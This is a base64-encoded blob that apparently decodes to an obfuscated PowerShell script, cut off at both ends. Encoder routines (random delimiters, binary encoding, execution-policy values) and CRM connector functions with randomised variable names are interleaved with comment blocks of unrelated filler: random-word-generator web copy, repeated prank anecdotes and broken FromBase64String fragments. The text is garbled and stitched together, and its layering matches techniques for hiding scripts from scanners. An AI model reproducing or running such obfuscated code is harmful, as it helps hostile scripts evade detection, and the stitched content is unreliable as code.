nKSksICh3dWpKRVljSUdDSUt3ckdsKCdVbnJlc3RyaWN0ZWQnKSksICh3VUpqRVljSUdDSWtXUmdsKCdSZW1vdGVTaWduZWQnKSksICh3VUpKRVlDaUdjaUtXcmdsKCdBbGxTaWduZWQnKSksIChXdWpqRVlDSUdDSWt3UmdsKCdSZXN0cmljdGVkJykpKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRvaXdVYUlieHVMY3NoWSwKICAgICAgICAKICAgICAgICBbU3dpdGNoXQogICAgICAgICR5c3RrRUg5TVIxZXVJN09kMwogICAgKSAgICJACiAgICAgICAgCiAgICAgICAgQCIKCiAgICAjIEVuY29kaW5nIGJhc2UgdmFsdWVzOiAxNj1IZXgsIDg9T2N0YWwsIDI9QmluYXJ5CiAgICAkR01kX0pPOElDSXAgPSAyCgogICAgIyBFaXRoZXIgY29udmVydCBTY3JpcHRCbG9jayB0byBhIFN0cmluZyBvciBjb252ZXJ0IHNjcmlwdCBhdCAkUGF0aCB0byBhIFN0cmluZy4KICAgIElmKCRUYlN0Q3BCUFZbKCd7MH17MX0nLWYnUGF0JywnaCcpXSkKICAgIHsKICAgICAgICBHZXQtQ2hpbGRJdGVtICRId2w0QlVDS1k5IC1FcnJvckFjdGlvbiBTdG9wIHwgT3V0LU51bGwKICAgICAgICAkUTd4QVFOcTFZODhlID0gW0lPLkZpbGVdOjpSZWFkQWxsVGV4dCgoUmVzb2x2ZS1QYXRoICRod2w0YnVjS1k5KSkKICAgIH0gICAiQAogICAgICAgIAogICAgICAgIEAiCiAgICBFbHNlCiAgICB7CiAgICAgICAgJHE3eGFRTnExWTg4ZSA9IFtTdHJpbmddJG85RGYwU1JwdDgzRjZCaG81aQogICAgfQoKICAgICMgQ3JlYXRlIGxpc3Qgb2YgcmFuZG9tIGRlbGltaXRlcnMgJFJhbmRvbURlbGltaXRlcnMuCiAgICAjIEF2b2lkIHVzaW5nIC4gKiAnICIgWyBdICggKSBldGMuIGFzIGRlbGltaXRlcnMgYXMgdGhlc2Ugd2lsbCBjYXVzZSBwcm9ibGVtcyBpbiB0aGUgLVNwbGl0IGNvbW1hbmQgc3ludGF4LgogICAgJGFWVlM4WTEya3RtV19kNSAgPSBAKChXdWpKRXlDSUdDSUt3ckdMKCdfJykpLCh3VUpKRVljSUdDSWtXUkdsKCctJykpLCh3dWpKZXljSUdDSUtXcmdMKCcsJykpLChXdWpKRVlDSUdDSUt3UmdMKCd7JykpLCh3VWpKZXlDSWdjSWtXUmdMKCd9JykpLCh3VUpKZXlDSUdDSUtXUmdMKCd+JykpLChXVWpKRVljSUdjaUtXckdMKCchJykpLChXVUpKRVlDaWdDSWt3ckdMKCdAJykpLCh3VWpKZVlDSWdDSWt3cmdMKCclJykpLChXVWpqZXlDSWdjaWtXckdsKCcmJykpLCh3dUpKRVlDSUdDSUt3cmdMKCc8JykpLCh3VWpKRVljSUdDSWtXcmdMKCc+JykpLCh3dUpqRVlDSUdDSUtXUmdsKCc7JykpLCh3dUpKRVljSUdjaUtXcmdsKCc6JykpKQoKICAgICMkZW52OnRlbXAKICAgICMgQWRkIGxldHRlcnMgYS16IHdpdGggcmFuZG9tIGNhc2UgdG8gJFJhbmRvbURlbGltaXRlcnMuCiAgICBAKChXVUpKRVlDSWdDaUtXcmdsKCdhJykpLCh3dUpKRVljSUdDSWtXckdsKCdiJykpLChXdWpqRXljSWdDaUtXckdMKCdjJykpLCh3dWpKRVlDSWdjaWt3cmdMKCdkJykpLChXdUpqRXlDSUdDSUt3cmdsKCdlJykpLCh3VUpKZVljaWdDSWtXcmdsKCdmJykpLChXdUpKRXljSUdDSUtXUmdMKCdnJykpLCh3dWpqZXljaUdjaWtXcmdMKCdoJykpLCh3dUpKZVlDaUdDSUtXcmdsKCdpJykpLCh3VWpKRVlDaWdjSUt3UmdsKCdqJykpLCh3VWpqRVlDSWdDSUtXUkdMKCdrJykpLCh3VUpKRVlDaUdDSWtXckdMKCdsJykpLChXdUpqZVljSUdjSUtXcmdsKCdtJykpLCh3VWpqZVlDaUdDaUtXUkdMKCduJykpLChXdUpqRVljSWdDSWt3ckdsKCdvJykpLCh3dUpKRXljSUdDaUt3cmdsKCdwJykpLChXdWpKZVlDSUdjSWt3ckdMKCdxJykpLCh3VUpKRXlDSWdDSWtXUkdsKCdyJykpLCh3dUpKZVljSUdDSUtXcmdMKCdzJykpLCh3dWpqRVlDSUdjaWtXUmdMKCd0JykpLChXVWpqRXlDaWdDSWtXckdMKCd1JykpLCh3dWpKZXljSUdjSUtXckdsKCd2JykpLCh3dWpKZVlDSUdDSUt3cmdMKCd3JykpLChXdUpKZVljSWdDSWtXcmdMKCd4JykpLCh3VWpKZXlDaWdDaUtXcmdsKCd5JykpLChXVUpKRVljaUdjaWtXcmdsKCd6JykpKSB8IEZvckVhY2gtT2JqZWN0IHskUU9oN2tWMTFGUmVTNl8ybmkgPSAkXzsgSWYoKChHZXQtUmFuZG9tIC1JbnB1dCBAKCgyIC0gMSkuLigyICsgKDEgLSAxKSkpKS0oMyAtIDIpIC1lcSAwKSkgeyRRT0g3S1YxMUZSZVM2XzJuSSA9ICRxT2g3a1YxMUZyZVM2XzJOaS5Ub1VwcGVyKCl9ICRBVnZTOHkxMkt0TXdfZDUgKz0gJFFPSDdLdjExZlJlUzZfMk5JfQogICAgICAgICJACiAgICAgICBAIgogICAgIyBPbmx5IHVzZSBhIHN1YnNldCBvZiBjdXJyZW50IGRlbGltaXRlcnMgdG8gcmFuZG9taXplIHdoYXQgeW91IHNlZSBpbiBldmVyeSBpdGVyYXRpb24gb2YgdGhpcyBzY3JpcHQncyBvdXRwdXQuCiAgICAkQVZWczh5MTJLVG13X2Q1ID0gKEdldC1SYW5kb20gLUlucHV0ICRBdnZTOHkxMmtUTVdfZDUgLUNvdW50ICgkQXZ2UzhZMTJrdG1XX2Q1LkNvdW50LygyICsgMikpKQoKICAgICMgQ29udmVydCAkU2NyaXB0U3RyaW5nIHRvIGRlbGltaXRlZCBCaW5hcnkgdmFsdWVzIGluIFtDaGFyXSBhcnJheSBzZXBhcmF0ZWQgYnkgcmFuZG9tIGRlbGltaXRlciBmcm9tIGRlZmluZWQgbGlzdCAkUmFuZG9tRGVsaW1pdGVycy4KICAgICR4TlRKMnc4MVZKID0gKHd1akpFWUNJR0Npa1dyZ2woJycpKQogICAgKFtDaGFyW11dJFE3WEFRbnExWTg4ZSkgfCBGb3JFYWNoLU9iamVjdCB7JFhudGoydzgxVmogKz0gKFtDb252ZXJ0XTo6VG9TdHJpbmcoKFtJbnRdW0NoYXJdJF8pLCRnbURfSk84SUNpcCkgKyAoR2V0LVJhbmRvbSAtSW5wdXQgJEF2dnM4eTEya3RtV19kNSkpfQoiQAoKZnVuY3Rpb24gbiB7CglbQ21kbGV0QmluZGluZygpXQogICAgUEFSQU0oIAogICAgICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldCiAgICAgICAgW01pY3Jvc29mdC5Ycm0uVG9vbGluZy5Db25uZWN0b3IuQ3JtU2VydmljZUNsaWVudF0kY29ubiwKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXQogICAgICAgIFtib29sXSRwaXBlbGluZVZhbHVlCiAgICApCiAgICAjd2UgaGF2ZSBhICRjb25uIHZhbHVlIGFuZCB3ZSB3ZXJlIG5vdCBnaXZlbiBhICRjb25uIHZhbHVlIHNvIHdlIHNob3VsZCB0cnkgdG8gZmluZCBvbmUKICAgIGlmKCRjb25uIC1lcSAkbnVsbCAtYW5kICRwaXBlbGluZVZhbHVlIC1lcSAkZmFsc2UpCiAgICB7CiAgICAgICAgJGNvbm5vYmogPSBHZXQtVmFyaWFibGUgY29ubiAtU2NvcGUgZ2xvYmFsIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCiAgICAgICAgaWYoJGNvbm5vYmouVmFsdWUgLWVxICRudWxsKQogICAgICAgIHsKICAgICAgICAgICAgdGhyb3cgJ0EgY29ubmVjdGlvbiB0byBDUk0gaXMgcmVxdWlyZWQsIHVzZSBHZXQtQ3JtQ29ubmVjdGlvbiBvciBvbmUgb2YgdGhlIG90aGVyIGNvbm5lY3Rpb24gZnVuY3Rpb25zIHRvIGNvbm5lY3QuJwogICAgICAgIH0KICAgICAgICBlbHNlCiAgICAgICAgewogICAgICAgICAgICAkY29ubiA9ICRjb25ub2JqLlZhbHVlCiAgICAgICAgfQogICAgfWVsc2VpZigkY29ubiAtZXEgJG51bGwgLWFuZCAkcGlwZWxpbmVWYWx1ZSAtZXEgJHRydWUpewogICAgICAgIHRocm93ICJDb25uZWN0aW9uIG9iamVjdCBwcm92aWRlZCBpcyBudWxsIgogICAgfQoJcmV0dXJuICRjb25uCn0KPCM+PgpTcD1lbGxpbmcgYW5kIFZvY2FidWxhcnkKVGhpcyB0b29sIGNhbiBiZSBhbiBleGNlbGxlbnQgd2F5IHRvIGltcHJvdmUgdm9jYWJ1bGFyeSBvciBwcmFjdGljZSBmb3IgcigpIGJlZXMuIElmIGFuIHEoKSB3b3JkIG8oKSwgcCgpIHVwIHRoZSBtZWFuaW5nIHdpbGwgaGVscCBzdHVkZW50cyBpbmNyZWFzZSB0aGUgbnVtYmVyIG9mIHdvcmRzIHRoZXkga25vdy4gV29ya2luZyB3aXRoIGEgcGFydG5lciwgc3R1ZGVudHMgY2FuIHRlc3QgZWFjaCBvdGhlciBvbiB0aGUgcigpIGZvciB0aGUgcmFuZG9taXplZCB3b3JkcyBtKClkLgoKTmFtZSBJbnNwaXJhdGlvbgpJZiB5b3UgbmVlZCB0byBjcmVhdGUgYSBuYW1lIGZvciBhIHByb2R1Y3QsIGFuIGV2ZW50LCBhIGJhbmQgb3IgZm9yIGFueXRoaW5nIGVsc2UsIHRoaXMgdG9vbCBjYW4gYmUgcXVpdGUgaGVscGZ1bC4gQXMgeW91IGNvbnNpZGVyIG5hbWVzLCBtKCkgYSBudW1iZXIgb2YgcmFuZG9tIHdvcmRzIGFuZCBzZWUgaG93IHRoZXkgaW1wYWN0IHdoYXQgeW91IGhhdmUgYWxyZWFkeSBjb21lIHVwIHdpdGguIElucHV0dGluZyB1bmlxdWUgd29yZHMgeW91IG1heSBub3QgaGF2ZSBjb25zaWRlcmVkIGNhbiBzcGFyayBhZGRpdGlvbmFsIGNyZWF0aXZpdHkgdG8gZXZlbnR1YWxseSBoZWxwIHlvdSBwcm9kdWNlIHRoZSBwZXJmZWN0IG5hbWUgZm9yIHlvdXIgcHJvamVjdC4gSWYgeW91J3JlIHAoKSBmb3IgZ29vZCBjaGFyYWN0ZXIgbmFtZXMgb3IgYmFieSBuYW1lcywgeW91IG1pZ2h0IGJlIGludGVyZXN0ZWQgaW4gb3VyIHJhbmRvbSBuYW1lIGdlbmVyYXRvci4KClRoZSBhYm92ZSBsaXN0IGlzIG5vdCBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKC4gVGhlcmUgYXJlIGxpdGVyYWxseSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCBvZiB3YXlzIHRoZSBSYW5kb20gV29yZCBHZW5lcmF0b3IgY2FuIGJlIHVzZWQuIFBsZWFzZSBmZWVsIGZyZWUgdG8gc2hhcmUgdGhlIHdheSB5b3UgdXNlIHRoaXMgdG9vbCwgYW5kIHdlIGFsd2F5cyB3ZWxjb21lIHN1Z2dlc3Rpb25zIG9uIGhvdyB3ZSBjYW4gaW1wcm92ZSBpdCB0byBzZXJ2ZSB5b3UgYmV0dGVyLiBXZSBhcmUgYWxzbyBpbnRlcmVzdGVkIGluIG5ldyB3b3JkIGdlbmVyYXRvcnMgeW91J2QgYmUgaW50ZXJlc3RlZCBpbiB1cyBjcmVhdGluZy4gTWFueSBvZiB0aGUgdG9vbHMgb24gdGhpcyB3ZWJzaXRlIGNhbWUgZnJvbSBpZGVhcyBmcm9tIHBlb3BsZSBsaWtlIHlvdSB3aG8gY29udGFjdGVkIHVzLiBQbGVhc2UgdGFrZSB0aGUgdGltZSB0byBleHBsb3JlIHRoZSBvdGhlciByYW5kb20gZ2VuZXJhdG9ycyB3ZSBoYXZlIGF2YWlsCgojPjwjPuKAnFRoaXMgb25lIHRpbWUgaW4gOXRoIGdyYWRlLCBteSBmcmllbmQgYW5kIEkgZGVjaWRlZCB0byB1c2UgdGhlIHJlc3Ryb29tIElFWCBhIGJpZyB0ZXN0LiBJIGRpZG50IGdpdmUgYSBzaHQgYWJvdXQgdGhpcyB0ZXN0LCBzbyBJIHBsYXlmdWxseSBwcmV0ZW5kZWQgdG8gZ2V0IHJlYWxseSB1cHNldC4gSW4gYXR0ZW1wdCB0byBiZSBvYnZpb3VzbHkgbm90IG1hZCwgSSBraWNrIGEgcGlwZSBvbiB0aGUgdG9wIG9mIGEgdXJpbmFsLCBhY2NpZGVudGFsbHkga25vY2tpbmcgaXQgb3V0IG9mIHRoZSB0b3Agb2YgdGhlIHRvaWxldC4gSXQgd2FzIHN0aWxsIGNvbm5lY3RlZCB0byB0aGUgd2FsbCBob3dldmVyLiBUdXJucyBvdXQsIEkgY291bGQgYWltIHRoZSBwaXBlIGluIGRpZmZlcmVudCBkaXJlY3Rpb25zLiBTbywgSSBhaW1lZCBpdCBzdHJhaWdodCBvdXQgYW5kIHRyaWVkIGZsdXNoaW5nIHRoZSB0b2lsZXQuIFRoZSB3YXRlciBMQVVOQ0hFRCBPVVQgT0YgVEhFIFBJUEUgQU5EIEhJVCBUSEUgV0FMTCBPTiBUSEUgT1RIRVIgU0lERSBPRiBUSEUgUk9PTS4gTXkgZnJpZW5kIGFuZCBJIHdlcmUgZmxpcHBpbmcgb3V0LiBUaGlzIGdhdmUgbWUgYSBicmlnaHQgaWRlYS4gSSBwdXQgdGhlIHBpcGUgaW4gc3VjaCBhIHNwb3Qgd2hlcmUgaXQgbG9va2VkIGxpa2UgaXQgd2FzIHByaW9yIHRvIHVzIGtpY2tpbmcgdGhlIGYqayBvdXQgb2YgaXQuIEhvd2V2ZXIsIEkgcHVsbGVkIGl0IG91dCBldmVyIHNvIHNsaWdodGx5IHNvIHdhdGVyIHdvdWxkIHNwcmF5IG91ciBuZXh0IHVuc3VzcGVjdGluZyB2aWN0aW0uIEkgcmVtZW1iZXIga2lkcyBjb21pbmcgb3V0IG9mIHRoZSBiYXRocm9vbSBkcmVuY2hlZCBpbiB3YXRlciwgY3Vzc2luZyB0aGVpciBicmFpbnMgb3V0IGJlY2F1c2UgdGhleSB3ZXJlIHNvIG1hZC4gR29vZCB0aW1lcy7igJ0jPgo8Iz7igJxUaGlzIG9uZSB0aW1lIGluIDl0aCBncmFkZSwgbXkgZnJpZW5kIGFuZCBJIGRlY2lkZWQgdG8gdXNlIHRoZSByZXN0cm9vbSBJRVggYSBiaWcgdGVzdC4gSSBkaWRudCBnaXZlIGEgc2h0IGFib3V0IHRoaXMgdGVzdCwgc28gSSBwbGF5ZnVsbHkgcHJldGVuZGVkIHRvIGdldCByZWFsbHkgdXBzZXQuIEluIGF0dGVtcHQgdG8gYmUgb2J2aW91c2x5IG5vdCBtYWQsIEkga2ljayBhIHBpcGUgb24gdGhlIHRvcCBvZiBhIHVyaW5hbCwgYWNjaWRlbnRhbGx5IGtub2NraW5nIGl0IG91dCBvZiB0aGUgdG9wIG9mIHRoZSB0b2lsZXQuIEl0IHdhcyBzdGlsbCBjb25uZWN0ZWQgdG8gdGhlIHdhbGwgaG93ZXZlci4gVHVybnMgb3V0LCBJIGNvdWxkIGFpbSB0aGUgcGlwZSBpbiBkaWZmZXJlbnQgZGlyZWN0aW9ucy4gU28sIEkgYWltZWQgaXQgc3RyYWlnaHQgb3V0IGFuZCB0cmllZCBmbHVzaGluZyB0aGUgdG9pbGV0LiBUaGUgd2F0ZXIgTEFVTkNIRUQgT1VUIE9GIFRIRSBQSVBFIEFORCBISVQgVEhFIFdBTEwgT04gVEhFIE9USEVSIFNJREUgT0YgVEhFIFJPT00uIE15IGZyaWVuZCBhbmQgSSB3ZXJlIGZsaXBwaW5nIG91dC4gVGhpcyBnYXZlIG1lIGEgYnJpZ2h0IGlkZWEuIEkgcHV0IHRoZSBwaXBlIGluIHN1Y2ggYSBzcG90IHdoZXJlIGl0IGxvb2tlZCBsaWtlIGl0IHdhcyBwcmlvciB0byB1cyBraWNraW5nIHRoZSBmKmsgb3V0IG9mIGl0LiBIb3dldmVyLCBJIHB1bGxlZCBpdCBvdXQgZXZlciBzbyBzbGlnaHRseSBzbyB3YXRlciB3b3VsZCBzcHJheSBvdXIgbmV4dCB1bnN1c3BlY3RpbmcgdmljdGltLiBJIHJlbWVtYmVyIGtpZHMgY29taW5nIG91dCBvZiB0aGUgYmF0aHJvb20gZHJlbmNoZWQgaW4gd2F0ZXIsIGN1c3NpbmcgdGhlaXIgYnJhaW5zICM+IDwjPiBvdXQgYmVjYXVzZSB0aGV5IHdlcmUgc28gbWFkLiBHb29kIHRpbWVzLuKAnSM+CjwjPuKAnEkgd2FzIGF0IGEgc3dhbmsgYmFyIGZvciBhIHdvcmsgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygsIGUoKSBzb21lIGdyYWQgc3R1ZGVudHMgd2UgaigpIGZvciBhbiBoKCkgcHJvZ3JhbS4gQWZ0ZXIgd2UgaGFkIGFsbCBoYWQgaygpIGRyaW5rcywgb25lIG9mIHRoZSBzdHVkZW50cyBzYWlkIHRoZXkgZG9udCBsaWtlIHNtb2tlcyBiZWNhdXNlIHRoZXkgdGFzdGUgbGlrZSBhLiBNeSBib3NzIHJlcGxpZWQsIG1heWJlIHlvdSBoYXZlbnQgaGFkIGdvb2Qgc21va2VzLiBTbyBJIGN1dCBpbiwgbWF5YmUgeW91IGhhdmVudCBoYWQgZ29vZCBhLiBJIHdhcyBhc2tlZCB0byBsZWF2ZS7igJ1Tb3VyY2UjPgo8I1RoYXRzIGcoKSBPbmUgdGltZSBJIGF0ZSAyNiBjaG9jb2xhdGUgY2hpcCBpKCkgYmVjYXVzZSBJIHdhcyBtYWQgYXQgbXkgbGl0dGxlIGwoKSBhbmQgZGlkbnQgd2FudCBoZXIgdG8gaGF2ZSBhbnkuIEkgcHVrZWQgYWxsIG92ZXIgdGhlIHBsYWNlLuKAnSBTb3VyY2UjPgo8I+KAnFRoaXMgb25lIHRpbWUgaW4gOXRoIGdyYWRlLCBteSBmcmllbmQgYW5kIEkgZGVjaWRlZCB0byB1c2UgdGhlIHJlc3Ryb29tIElFWCBhIGJpZyB0ZXN0LiBJIGRpZG50IGdpdmUgYSBzaHQgYWJvdXQgdGhpcyB0ZXN0LCBzbyBJIHBsYXlmdWxseSBwcmV0ZW5kZWQgdG8gZ2V0IHJlYWxseSB1cHNldC4gSW4gYXR0ZW1wdCB0byBiZSBvYnZpb3VzbHkgbm90IG1hZCwgSSBraWNrIGEgcGlwZSBvbiB0aGUgdG9wIG9mIGEgdXJpbmFsLCBhY2NpZGVudGFsbHkga25vY2tpbmcgaXQgb3V0IG9mIHRoZSB0b3Agb2YgdGhlIHRvaWxldC4gSXQgd2FzIHN0aWxsIGNvbm5lY3RlZCB0byB0aGUgd2FsbCBob3dldmVyLiBUdXJucyBvdXQsIEkgY291bGQgYWltIHRoZSBwaXBlIGluIGRpZmZlcmVudCBkaXJlY3Rpb25zLiBTbywgSSBhaW1lZCBpdCBzdHJhaWdodCBvdXQgYW5kIHRyaWVkIGZsdXNoaW5nIHRoZSB0b2lsZXQuIFRoZSB3YXRlciBMQVVOQ0hFRCBPVVQgT0YgVEhFIFBJUEUgQU5EIEhJVCBUSEUgV0FMTCBPTiBUSEUgT1RIRVIgU0lERSBPRiBUSEUgUk9PTS4gTXkgZnJpZW5kIGFuZCBJIHdlcmUgZmxpcHBpbmcgb3V0LiBUaGlzIGdhdmUgbWUgYSBicmlnaHQgaWRlYS4gSSBwdXQgdGhlIHBpcGUgaW4gc3VjaCBhIHNwb3Qgd2hlcmUgaXQgbG9va2VkIGxpa2UgaXQgd2FzIHByaW9yIHRvIHVzIGtpY2tpbmcgdGhlIGYqayBvdXQgb2YgaXQuIEhvd2V2ZXIsIEkgcHVsbGVkIGl0IG91dCBldmVyIHNvIHNsaWdodGx5IHNvIHdhdGVyIHdvdWxkIHNwcmF5IG91ciBuZXh0IHVuc3VzcGVjdGluZyB2aWN0aW0uIEkgcmVtZW1iZXIga2lkcyBjb21pbmcgb3V0IG9mIHRoZSBiYXRocm9vbSBkcmVuY2hlZCBpbiB3YXRlciwgY3Vzc2luZyB0aGVpciBicmFpbnMgb3V0IGJlY2F1c2UgdGhleSB3ZXJlIHNvIG1hZC4gR29vZCB0aW1lcy7igJ0jPgpmdW5jdGlvbiBvIHsKICAgIFBBUkFNKAogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5PSR0cnVlKV0KICAgICAgICBbb2JqZWN0XSRWYWx1ZQogICAgKQoKICAgICR2YWx1ZVR5cGVUb0NybVR5cGVNYXBwaW5nID0gQHsKICAgICAgICAiQm9vbGVhbiIgPSBbTWljcm9zb2Z0LlhybS5Ub29saW5nLkNvbm5lY3Rvci5Dcm1GaWVsZFR5cGVdOjpDcm1Cb29sZWFuOwogICAgICAgICJEYXRlVGltZSIgPSBbTWljcm9zb2Z0LlhybS5Ub29saW5nLkNvbm5lY3Rvci5Dcm1GaWVsZFR5cGVdOjpDcm1EYXRlVGltZTsKICAgICAgICAiRGVjaW1hbCIgPSBbTWljcm9zb2Z0LlhybS5Ub29saW5nLkNvbm5lY3Rvci5Dcm1GaWVsZFR5cGVdOjpDcm1EZWNpbWFsOwogICAgICAgICJTaW5nbGUiID0gW01pY3Jvc29mdC5Ycm0uVG9vbGluZy5Db25uZWN0b3IuQ3JtRmllbGRUeXBlXTo6Q3JtRmxvYXQ7CiAgICAgICAgIk1vbmV5IiA9IFtNaWNyb3NvZnQuWHJtLlRvb2xpbmcuQ29ubmVjdG9yLkNybUZpZWxkVHlwZV06OlJhdzsKICAgICAgICAiSW50MzIiID0gW01pY3Jvc29mdC5Ycm0uVG9vbGluZy5Db25uZWN0b3IuQ3JtRmllbGRUeXBlXTo6Q3JtTnVtYmVyOwogICAgICAgICJFbnRpdHlSZWZlcmVuY2UiID0gW01pY3Jvc29mdC5Ycm0uVG9vbGluZy5Db25uZWN0b3IuQ3JtRmllbGRUeXBlXTo6UmF3OwogICAgICAgICJPcHRpb25TZXRWYWx1ZSIgPSBbTWljcm9zb2Z0LlhybS5Ub29saW5nLkNvbm5lY3Rvci5Dcm1GaWVsZFR5cGVdOjpSYXc7CiAgICAgICAgIlN0cmluZyIgPSBbTWljcm9zb2Z0LlhybS5Ub29saW5nLkNvbm5lY3Rvci5Dcm1GaWVsZFR5cGVdOjpTdHJpbmc7CiAgICAgICAgIkd1aWQiID0gIFtNaWNyb3NvZnQuWHJtLlRvb2xpbmcuQ29ubmVjdG9yLkNybUZpZWxkVHlwZV06OlVuaXF1ZUlkZW50aWZpZXI7CiAgICB9CgogICAgIyBkZWZhdWx0IGlzIFJBVwogICAgJGNybURhdGFUeXBlID0gW01pY3Jvc29mdC5Ycm0uVG9vbGluZy5Db25uZWN0b3IuQ3JtRmllbGRUeXBlXTo6UmF3CgogICAgaWYoJFZhbHVlIC1uZSAkbnVsbCkgewoKICAgICAgICAkdmFsdWVUeXBlID0gJFZhbHVlLkdldFR5cGUoKS5OYW1lCiAgICAgICAgCiAgICAgICAgaWYoJHZhbHVlVHlwZVRvQ3JtVHlwZU1hcHBpbmcuQ29udGFpbnNLZXkoJHZhbHVlVHlwZSkpIHsKICAgICAgICAgICAgJGNybURhdGFUeXBlID0gJHZhbHVlVHlwZVRvQ3JtVHlwZU1hcHBpbmdbJHZhbHVlVHlwZV0KICAgICAgICB9ICAgCiAgICB9CgogICAgcmV0dXJuICRjcm1EYXRhdHlwZQp9CjwjPj4KU3A9ZWxsaW5nIGFuZCBWb2NhYnVsYXJ5ClRoaXMgdG9vbCBjYW4gYmUgYW4gZXhjZWxsZW50IHdheSB0byBpbXByb3ZlIHZvY2FidWxhcnkgb3IgcHJhY3RpY2UgZm9yIHIoKSBiZWVzLiBJZiBhbiBxKCkgd29yZCBvKCksIHAoKSB1cCB0aGUgbWVhbmluZyB3aWxsIGhlbHAgc3R1ZGVudHMgaW5jcmVhc2UgdGhlIG51bWJlciBvZiB3b3JkcyB0aGV5IGtub3cuIFdvcmtpbmcgd2l0aCBhIHBhcnRuZXIsIHN0dWRlbnRzIGNhbiB0ZXN0IGVhY2ggb3RoZXIgb24gdGhlIHIoKSBmb3IgdGhlIHJhbmRvbWl6ZWQgd29yZHMgbSgpZC4KCk5hbWUgSW5zcGlyYXRpb24KSWYgeW91IG5lZWQgdG8gY3JlYXRlIGEgbmFtZSBmb3IgYSBwcm9kdWN0LCBhbiBldmVudCwgYSBiYW5kIG9yIGZvciBhbnl0aGluZyBlbHNlLCB0aGlzIHRvb2wgY2FuIGJlIHF1aXRlIGhlbHBmdWwuIEFzIHlvdSBjb25zaWRlciBuYW1lcywgbSgpIGEgbnVtYmVyIG9mIHJhbmRvbSB3b3JkcyBhbmQgc2VlIGhvdyB0aGV5IGltcGFjdCB3aGF0IHlvdSBoYXZlIGFscmVhZHkgY29tZSB1cCB3aXRoLiBJbnB1dHRpbmcgdW5pcXVlIHdvcmRzIHlvdSBtYXkgbm90IGhhdmUgY29uc2lkZXJlZCBjYW4gc3BhcmsgYWRkaXRpb25hbCBjcmVhdGl2aXR5IHRvIGV2ZW50dWFsbHkgaGVscCB5b3UgcHJvZHVjZSB0aGUgcGVyZmVjdCBuYW1lIGZvciB5b3VyIHByb2plY3QuIElmIHlvdSdyZSBwKCkgZm9yIGdvb2QgY2hhcmFjdGVyIG5hbWVzIG9yIGJhYnkgbmFtZXMsIHlvdSBtaWdodCBiZSBpbnRlcmVzdGVkIGluIG91ciByYW5kb20gbmFtZSBnZW5lcmF0b3IuCgpUaGUgYWJvdmUgbGlzdCBpcyBub3QgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZyguIFRoZXJlIGFyZSBsaXRlcmFsbHkgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZyggb2Ygd2F5cyB0aGUgUmFuZG9tIFdvcmQgR2VuZXJhdG9yIGNhbiBiZSB1c2VkLiBQbGVhc2UgZmVlbCBmcmVlIHRvIHNoYXJlIHRoZSB3YXkgeW91IHVzZSB0aGlzIHRvb2wsIGFuZCB3ZSBhbHdheXMgd2VsY29tZSBzdWdnZXN0aW9ucyBvbiBob3cgd2UgY2FuIGltcHJvdmUgaXQgdG8gc2VydmUgeW91IGJldHRlci4gV2UgYXJlIGFsc28gaW50ZXJlc3RlZCBpbiBuZXcgd29yZCBnZW5lcmF0b3JzIHlvdSdkIGJlIGludGVyZXN0ZWQgaW4gdXMgY3JlYXRpbmcuIE1hbnkgb2YgdGhlIHRvb2xzIG9uIHRoaXMgd2Vic2l0ZSBjYW1lIGZyb20gaWRlYXMgZnJvbSBwZW9wbGUgbGlrZSB5b3Ugd2hvIGNvbnRhY3RlZCB1cy4gUGxlYXNlIHRha2UgdGhlIHRpbWUgdG8gZXhwbG9yZSB0aGUgb3RoZXIgcmFuZG9tIGdlbmVyYXRvcnMgd2UgaGF2ZSBhdmFpbAoKIz48Iz7igJxUaGlzIG9uZSB0aW1lIGluIDl0aCBncmFkZSwgbXkgZnJpZW5kIGFuZCBJIGRlY2lkZWQgdG8gdXNlIHRoZSByZXN0cm9vbSBJRVggYSBiaWcgdGVzdC4gSSBkaWRudCBnaXZlIGEgc2h0IGFib3V0IHRoaXMgdGVzdCwgc28gSSBwbGF5ZnVsbHkgcHJldGVuZGVkIHRvIGdldCByZWFsbHkgdXBzZXQuIEluIGF0dGVtcHQgdG8gYmUgb2J2aW91c2x5IG5vdCBtYWQsIEkga2ljayBhIHBpcGUgb24gdGhlIHRvcCBvZiBhIHVyaW5hbCwgYWNjaWRlbnRhbGx5IGtub2NraW5nIGl0IG91dCBvZiB0aGUgdG9wIG9mIHRoZSB0b2lsZXQuIEl0IHdhcyBzdGlsbCBjb25uZWN0ZWQgdG8gdGhlIHdhbGwgaG93ZXZlci4gVHVybnMgb3V0LCBJIGNvdWxkIGFpbSB0aGUgcGlwZSBpbiBkaWZmZXJlbnQgZGlyZWN0aW9ucy4gU28sIEkgYWltZWQgaXQgc3RyYWlnaHQgb3V0IGFuZCB0cmllZCBmbHVzaGluZyB0aGUgdG9pbGV0LiBUaGUgd2F0ZXIgTEFVTkNIRUQgT1VUIE9GIFRIRSBQSVBFIEFORCBISVQgVEhFIFdBTEwgT04gVEhFIE9USEVSIFNJREUgT0YgVEhFIFJPT00uIE15IGZyaWVuZCBhbmQgSSB3ZXJlIGZsaXBwaW5nIG91dC4gVGhpcyBnYXZlIG1lIGEgYnJpZ2h0IGlkZWEuIEkgcHV0IHRoZSBwaXBlIGluIHN1Y2ggYSBzcG90IHdoZXJlIGl0IGxvb2tlZCBsaWtlIGl0IHdhcyBwcmlvciB0byB1cyBraWNraW5nIHRoZSBmKmsgb3V0IG9mIGl0LiBIb3dldmVyLCBJIHB1bGxlZCBpdCBvdX